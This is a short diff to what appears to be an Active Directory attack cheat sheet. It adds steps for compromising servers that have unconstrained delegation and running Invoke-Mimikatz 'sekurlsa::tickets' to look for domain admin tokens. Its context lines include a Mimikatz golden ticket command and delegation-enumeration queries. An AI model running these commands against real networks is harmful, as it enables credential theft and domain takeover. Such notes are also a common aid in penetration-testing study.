@@ -646,3 +646,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Using Active Directory module.
   - `Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
   - `Get-ADUser -Filter {TrustedForDelegation -eq $True}`
+
+- Compromise the server(s) where Unconstrained delegation is enabled.
+- Run following command on it to check if any DA token is available
+  - `Invoke-Mimikatz -Command '"sekurlsa::tickets"'` 
